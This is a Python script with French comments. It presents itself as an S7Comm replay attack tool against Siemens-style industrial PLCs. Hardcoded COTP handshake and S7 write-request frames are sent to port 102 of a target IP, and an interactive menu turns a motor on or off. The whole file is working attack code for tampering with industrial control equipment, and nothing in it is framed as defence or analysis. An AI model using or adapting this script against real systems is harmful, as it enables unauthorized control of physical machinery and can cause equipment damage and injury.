import socket
import time
import sys

# Trames S7Comm (Handshake + Write request)
# Note : Ces trames sont spécifiques à l'adresse mémoire visée lors de ta capture initiale
ON  = bytes.fromhex("0300002402f080320100000001000e00050501120a100100010000830000080003000101")
OFF = bytes.fromhex("0300002402f080320100000001000e00050501120a100100010000830000080003000100")
HS  = bytes.fromhex("0300001611e00000000100c1020100c2020201c0010a" + "0300001902f08032010000000100080000f0000001000101e0")

def injection_s7(target_ip, port=102):
    print("\n" + "="*50)
    print(f"   S7COMM REPLAY ATTACK - CIBLE: {target_ip}   ")
    print("="*50)

    def envoyer_commande(trame, action):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, port))
            
            # Étape 1 : Handshake COTP
            s.send(HS[:22])
            s.recv(1024)
            
            # Étape 2 : S7 Setup Communication
            s.send(HS[22:])
            s.recv(1024)
            
            # Étape 3 : Envoi de la trame malveillante (Write Request)
            s.send(trame)
            print(f" [OK] Commande envoyée : {action}")
            s.close()
            return True
        except Exception as e:
            print(f" [!] Erreur sur {target_ip} : {e}")
            return False

    # Menu interne de l'attaque
    while True:
        print(f"\nConfiguration actuelle : {target_ip}:{port}")
        c = input(" [1] Allumer Moteur (ON)\n [2] Éteindre Moteur (OFF)\n [Q] Retour au menu\n > ").lower()
        
        if c == "1":
            envoyer_commande(ON, "MOTEUR ON")
        elif c == "2":
            envoyer_commande(OFF, "MOTEUR OFF")
        elif c == "q":
            break
        else:
            print("Choix invalide.")

if __name__ == "__main__":
    # Si lancé seul : python3 indus_inj.py 192.168.0.10
    if len(sys.argv) > 1:
        ip_cible = sys.argv[1]
        injection_s7(ip_cible)
    else:
        ip_par_defaut = input("[?] Entrez l'IP de l'automate : ")
        injection_s7(ip_par_defaut)
